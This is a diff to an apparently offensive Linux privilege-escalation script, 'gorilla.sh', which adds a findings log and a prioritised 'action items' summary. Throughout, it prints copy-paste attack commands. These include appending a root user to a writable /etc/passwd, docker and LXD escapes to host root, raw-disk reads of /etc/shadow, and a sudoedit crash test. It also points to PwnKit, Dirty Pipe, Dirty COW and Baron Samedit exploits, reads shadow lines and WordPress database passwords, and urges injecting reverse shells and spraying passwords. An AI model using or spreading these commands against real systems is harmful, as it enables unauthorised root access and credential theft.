@@ -42,6 +42,17 @@ echo ""
 echo -e "\033[1;31;103m Privilege Escalation Vector \033[0m"
 
 # ============================================================================
+# FINDINGS COLLECTOR — logs critical findings for summary at the end
+# ============================================================================
+FINDINGS_FILE=$(mktemp /tmp/gorilla_findings.XXXXXX 2>/dev/null || echo "/tmp/gorilla_findings.$$")
+: > "$FINDINGS_FILE"
+
+log_finding() {
+    # $1 = priority (CRITICAL/HIGH/MEDIUM), $2 = message
+    echo "$1|$2" >> "$FINDINGS_FILE"
+}
+
+# ============================================================================
 # EXPLOIT COMMANDS DATABASE
 # Returns exploit commands for a given binary name + mode (suid/sudo/cap)
 # ============================================================================
@@ -669,6 +680,7 @@ if [ -f /usr/bin/pkexec ]; then
             if awk "BEGIN {exit !($pkexec_version < 0.120)}"; then
                 echo -e "\033[1;31;103m VULNERABLE pkexec $pkexec_version < 0.120 \033[0m"
                 get_exploit pkexec suid
+                log_finding "CRITICAL" "PwnKit CVE-2021-4034 — pkexec $pkexec_version (SUID) → get root instantly"
             else
                 echo -e "${GREEN}Not vulnerable (pkexec >= 0.120)${NC}"
             fi
@@ -688,6 +700,7 @@ if (( ${ver1:-0} == 5 && ${ver2:-0} >= 8 && ${ver2:-0} <= 16 )); then
     if ! (( ${ver2:-0} == 16 && ${ver3:-0} >= 11 )); then
         echo -e "\033[1;31;103m VULNERABLE — Kernel $ver1.$ver2.$ver3 \033[0m"
         echo -e "  ${LMAGENTA}Exploit: https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit${NC}"
+        log_finding "CRITICAL" "Dirty Pipe CVE-2022-0847 — kernel $ver1.$ver2.$ver3"
     else
         echo -e "${GREEN}Not vulnerable (patched)${NC}"
     fi
@@ -701,6 +714,7 @@ if (( ${ver1:-0} < 4 )) || (( ${ver1:-0} == 4 && ${ver2:-0} < 9 )); then
     echo -e "\033[1;31;103m POSSIBLY VULNERABLE — Kernel $ver1.$ver2.$ver3 \033[0m"
     echo -e "  ${LMAGENTA}Exploit: gcc -pthread dirty.c -o dirty -lcrypt${NC}"
     echo -e "  ${LMAGENTA}https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs${NC}"
+    log_finding "CRITICAL" "Dirty COW CVE-2016-5195 — kernel $ver1.$ver2.$ver3"
 else
     echo -e "${GREEN}Not vulnerable${NC}"
 fi
@@ -733,6 +747,7 @@ if [ ! -z "$sudo_version" ]; then
         echo -e "\033[1;31;103m LIKELY VULNERABLE — sudo $sudo_version in affected range \033[0m"
         echo -e "  ${LMAGENTA}Exploit: https://github.com/blasty/CVE-2021-3156${NC}"
         echo -e "  ${LMAGENTA}Test: sudoedit -s '\\' \$(python3 -c \"print('A'*100)\") — segfault = vuln${NC}"
+        log_finding "CRITICAL" "Baron Samedit CVE-2021-3156 — sudo $sudo_version"
     else
         echo -e "${GREEN}Not vulnerable (sudo $sudo_version outside affected range)${NC}"
     fi
@@ -784,6 +799,7 @@ if [ -w /etc/passwd ]; then
     echo -e "\033[1;31;103m /etc/passwd is WRITABLE! \033[0m"
     echo -e "  ${LMAGENTA}openssl passwd -1 -salt hacker password123${NC}"
     echo -e "  ${LMAGENTA}echo 'hacker:\$1\$hacker\$TdQy4...:0:0:root:/root:/bin/bash' >> /etc/passwd${NC}"
+    log_finding "CRITICAL" "/etc/passwd is WRITABLE — add root user directly"
 fi
 
 echo -e "\n${YELLOW}[+] ${NC}/etc/shadow permissions:"
@@ -791,6 +807,7 @@ ls -lah /etc/shadow 2>/dev/null
 if [ -r /etc/shadow ]; then
     echo -e "\033[1;31;103m /etc/shadow is READABLE! \033[0m"
     head -5 /etc/shadow 2>/dev/null
+    log_finding "CRITICAL" "/etc/shadow is READABLE — crack hashes offline"
 fi
 
 hashesinpasswd=$(grep -v '^[^:]*:[x*]' /etc/passwd 2>/dev/null | grep -v '^#')
@@ -823,6 +840,7 @@ check_sudo_exploits() {
             get_exploit "$bin" sudo
             echo ""
             found=1
+            log_finding "CRITICAL" "Sudo exploitable: $bin"
         fi
     done
     [ $found -eq 0 ] && echo -e "${GREEN}  No known exploitable sudo binaries found${NC}"
@@ -868,6 +886,7 @@ if [ ! -z "$suid_files" ]; then
             get_exploit "$bin" suid
             echo ""
             exploitable_suid=1
+            log_finding "CRITICAL" "SUID exploitable: $file → run get_exploit for command"
         fi
     done <<< "$suid_files"
 
@@ -939,6 +958,7 @@ for dir in $(echo $PATH | tr ":" " "); do
     if [ -d "$dir" ] && [ -w "$dir" ]; then
         echo -e "  \033[1;31;103m WRITABLE: $dir — PATH hijacking possible! \033[0m"
         writable_path=1
+        log_finding "HIGH" "Writable PATH dir: $dir — path hijacking"
     fi
 done
 [ $writable_path -eq 0 ] && echo -e "${GREEN}  No writable PATH dirs${NC}"
@@ -969,6 +989,7 @@ ww_cron=$(find /etc/cron* -writable 2>/dev/null)
 if [ "$ww_cron" ]; then
     echo -e "\033[1;31;103m Writable cron entries! \033[0m"
     echo -e "${LRED}$ww_cron${NC}"
+    log_finding "CRITICAL" "Writable cron files — inject reverse shell"
 else
     echo -e "${GREEN}  None${NC}"
 fi
@@ -977,6 +998,7 @@ echo -e "\n${YELLOW}[+] ${NC}Writable scripts referenced in cron:"
 grep -hEv '^#|^$|^[A-Z]' /etc/crontab /etc/cron.d/* 2>/dev/null | awk '{for(i=6;i<=NF;i++) print $i}' | grep -oE '/[^ ;|&>]+' | sort -u | while read script; do
     if [ -w "$script" ] 2>/dev/null; then
         echo -e "  \033[1;31;103m WRITABLE: $script \033[0m"
+        log_finding "CRITICAL" "Writable cron script: $script"
     fi
 done
 
@@ -988,6 +1010,7 @@ ww_svc=$(find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/n
 if [ "$ww_svc" ]; then
     echo -e "\033[1;31;103m Writable service files! \033[0m"
     echo -e "${LRED}$ww_svc${NC}"
+    log_finding "CRITICAL" "Writable systemd service files — inject reverse shell"
 else
     echo -e "${GREEN}  None${NC}"
 fi
@@ -1042,6 +1065,7 @@ for keytype in id_rsa id_ecdsa id_ed25519 id_dsa; do
         for key in $keys; do
             if [ -r "$key" ]; then
                 echo -e "  \033[1;31;103m READABLE: $key \033[0m"
+                log_finding "HIGH" "Readable SSH private key: $key"
             else
                 echo -e "  ${CYAN}$key (not readable)${NC}"
             fi
@@ -1113,6 +1137,7 @@ echo -e "\n${YELLOW}[+] ${NC}WordPress configs:"
 wp_configs=$(find / -name "wp-config.php" -readable 2>/dev/null | head -5)
 if [ "$wp_configs" ]; then
     echo -e "\033[1;31;103m wp-config.php found! \033[0m"
+    log_finding "HIGH" "WordPress wp-config.php readable — DB credentials"
     for f in $wp_configs; do
         echo -e "  ${LRED}$f${NC}"
         grep -E "DB_USER|DB_PASSWORD" "$f" 2>/dev/null | while read line; do
@@ -1233,6 +1258,7 @@ if echo "$current_groups" | grep -q docker; then
     echo -e "\n\033[1;31;103m USER IS IN DOCKER GROUP! \033[0m"
     echo -e "  ${LMAGENTA}docker run -v /:/mnt --rm -it alpine chroot /mnt sh${NC}"
     docker image ls 2>/dev/null | head -5
+    log_finding "CRITICAL" "User in DOCKER group — instant root via container"
 fi
 
 # LXD group
@@ -1241,6 +1267,7 @@ if echo "$current_groups" | grep -qE "lxd|lxc"; then
     echo -e "  ${LMAGENTA}lxc init IMAGE privesc -c security.privileged=true${NC}"
     echo -e "  ${LMAGENTA}lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true${NC}"
     echo -e "  ${LMAGENTA}lxc start privesc && lxc exec privesc /bin/bash${NC}"
+    log_finding "CRITICAL" "User in LXD/LXC group — container escape to root"
 fi
 
 # Disk group
@@ -1248,6 +1275,7 @@ if echo "$current_groups" | grep -q disk; then
     echo -e "\n\033[1;31;103m USER IS IN DISK GROUP! \033[0m"
     echo -e "  ${LMAGENTA}debugfs /dev/sda1  →  cat /etc/shadow${NC}"
     echo -e "  ${LMAGENTA}strings /dev/sda1 | grep -i password${NC}"
+    log_finding "CRITICAL" "User in DISK group — raw disk read (shadow, SSH keys)"
 fi
 
 # Adm group
@@ -1268,6 +1296,7 @@ if [ -r /etc/exports ]; then
     cat /etc/exports 2>/dev/null | grep -v "^#" | while read line; do
         if echo "$line" | grep -q "no_root_squash"; then
             echo -e "  \033[1;31;103m $line — no_root_squash! \033[0m"
+            log_finding "CRITICAL" "NFS no_root_squash — mount and create SUID binary"
         else
             [ -n "$line" ] && echo -e "  $line"
         fi
@@ -1321,24 +1350,46 @@ if [ -n "$USERNAME" ]; then
 fi
 
 # ============================================================================
-# FINAL SUMMARY
+# FINAL SUMMARY — ACTION ITEMS
 # ============================================================================
 echo -e "\n${LBLUE}╔═══════════════════════════════════════════════════════════╗${NC}"
-echo -e "${LBLUE}║               ENUMERATION COMPLETE 🦍                     ║${NC}"
+echo -e "${LBLUE}║            🦍 SUMMARY — ACTION ITEMS                      ║${NC}"
 echo -e "${LBLUE}╚═══════════════════════════════════════════════════════════╝${NC}"
 
-echo -e "\n${LMAGENTA}[!] REMINDERS:${NC}"
-echo -e "${LMAGENTA}  • Check all SUID/sudo exploits above — copy-paste ready${NC}"
-echo -e "${LMAGENTA}  • Try: sudo -l (with any found passwords)${NC}"
-echo -e "${LMAGENTA}  • Check kernel version against exploit-db${NC}"
-echo -e "${LMAGENTA}  • Suspicious dir? grep -RniE 'pass|password|secret|token|key' /path${NC}"
+critical_count=$(grep -c "^CRITICAL|" "$FINDINGS_FILE" 2>/dev/null || echo 0)
+high_count=$(grep -c "^HIGH|" "$FINDINGS_FILE" 2>/dev/null || echo 0)
+total=$((critical_count + high_count))
 
-if [ -z "$PASSWORD" ]; then
-    echo -e "\n\033[1;31;103m Run with -p PASSWORD if you found credentials! \033[0m"
+if [ $total -eq 0 ]; then
+    echo -e "\n${GREEN}  No critical or high-priority vectors found.${NC}"
+    echo -e "${YELLOW}  Manual investigation needed — check output above for leads.${NC}"
+else
+    if [ $critical_count -gt 0 ]; then
+        echo -e "\n${LRED}  ══════ CRITICAL — Try these FIRST ══════${NC}"
+        grep "^CRITICAL|" "$FINDINGS_FILE" 2>/dev/null | cut -d'|' -f2 | while read line; do
+            echo -e "  ${LRED}🔴 $line${NC}"
+        done
+    fi
+
+    if [ $high_count -gt 0 ]; then
+        echo -e "\n${YELLOW}  ══════ HIGH — Investigate these ══════${NC}"
+        grep "^HIGH|" "$FINDINGS_FILE" 2>/dev/null | cut -d'|' -f2 | while read line; do
+            echo -e "  ${YELLOW}🟡 $line${NC}"
+        done
+    fi
 fi
+
+echo -e "\n${LMAGENTA}  ══════ NEXT STEPS ══════${NC}"
+echo -e "${LMAGENTA}  • Scroll up for copy-paste exploit commands${NC}"
+echo -e "${LMAGENTA}  • Found a password? Re-run: ./gorilla.sh -p 'PASSWORD'${NC}"
+echo -e "${LMAGENTA}  • Suspicious dir? grep -RniE 'pass|secret|token|key' /path${NC}"
+
 if [ -n "$PASSWORD" ]; then
-    echo -e "\n\033[1;31;103m PASSWORD SPRAY: try this password against ALL users! \033[0m"
-    echo -e "  ${LMAGENTA}su - <user>  # try each user with login shell${NC}"
+    echo -e "\n\033[1;31;103m PASSWORD SPRAY: try this password against ALL login-shell users! \033[0m"
 fi
 
 echo -e "\n${YELLOW}Completed at:${NC} $(date)"
+echo -e "${CYAN}Total findings: ${critical_count} critical, ${high_count} high${NC}\n"
+
+# Cleanup
+rm -f "$FINDINGS_FILE" 2>/dev/null
